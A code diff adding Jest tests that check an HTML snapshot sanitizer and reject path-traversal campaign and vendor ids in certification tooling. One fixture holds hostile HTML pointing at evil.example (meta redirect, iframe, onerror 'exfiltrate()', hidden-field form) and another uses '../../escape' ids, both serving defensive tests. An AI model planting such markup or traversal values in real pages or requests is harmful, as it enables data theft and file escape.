@@ -67,6 +67,32 @@ describe('live certification tooling', () => {
     expect(sanitized.html).not.toContain('acme-admin.okta.com');
   });
 
+  test('sanitizeLiveSnapshotHtml strips active content before persisting snapshots', () => {
+    const raw = `
+      <meta http-equiv="refresh" content="0;https://evil.example/redirect">
+      <script>window.__secret = "token-123"</script>
+      <iframe src="https://evil.example/frame"></iframe>
+      <a href="https://evil.example/download" onclick="steal()">download</a>
+      <img src="https://evil.example/pixel.png" onerror="exfiltrate()">
+      <form action="https://evil.example/submit">
+        <input type="hidden" name="csrf" value="secret">
+      </form>
+    `;
+
+    const sanitized = sanitizeLiveSnapshotHtml('okta', raw);
+    expect(sanitized.redactionCount).toBeGreaterThanOrEqual(6);
+    expect(sanitized.html).not.toContain('<script');
+    expect(sanitized.html).not.toContain('<iframe');
+    expect(sanitized.html).not.toContain('http-equiv="refresh"');
+    expect(sanitized.html).not.toContain('href=');
+    expect(sanitized.html).not.toContain('src=');
+    expect(sanitized.html).not.toContain('onclick=');
+    expect(sanitized.html).not.toContain('onerror=');
+    expect(sanitized.html).not.toContain('action=');
+    expect(sanitized.html).not.toContain('type="hidden"');
+    expect(sanitized.html).not.toContain('evil.example');
+  });
+
   test('runCertificationHarness marks matching live replay as review-required before approval', async () => {
     const root = fs.mkdtempSync(path.join(os.tmpdir(), 'thrunt-cert-pass-'));
     try {
@@ -208,6 +234,33 @@ describe('live certification tooling', () => {
 
       expect(report.vendors[0]?.status?.status).toBe('live-blocked');
       expect(report.vendors[0].liveSnapshots).toBe(1);
+    } finally {
+      fs.rmSync(root, { recursive: true, force: true });
+    }
+  });
+
+  test('createBlockedCertificationCampaign rejects traversal-like vendor ids', () => {
+    const root = fs.mkdtempSync(path.join(os.tmpdir(), 'thrunt-cert-vendor-id-'));
+    try {
+      expect(() => createBlockedCertificationCampaign(root, {
+        vendorId: '../../escape',
+        tenantLabel: 'sandbox',
+        environmentLabel: 'live',
+        operator: 'operator',
+        blockerReasons: ['missing connector profile'],
+      })).toThrow(/Invalid certification vendorId/);
+
+      expect(fs.existsSync(path.join(root, '.planning', 'certification', 'campaigns'))).toBe(false);
+    } finally {
+      fs.rmSync(root, { recursive: true, force: true });
+    }
+  });
+
+  test('readCertificationCampaign ignores traversal-like campaign ids', () => {
+    const root = fs.mkdtempSync(path.join(os.tmpdir(), 'thrunt-cert-campaign-id-'));
+    try {
+      expect(readCertificationCampaign(root, '../escape')).toBeNull();
+      expect(readCertificationCampaign(root, 'CERT-AWS-20260412010101-ABCD/../../escape')).toBeNull();
     } finally {
       fs.rmSync(root, { recursive: true, force: true });
     }
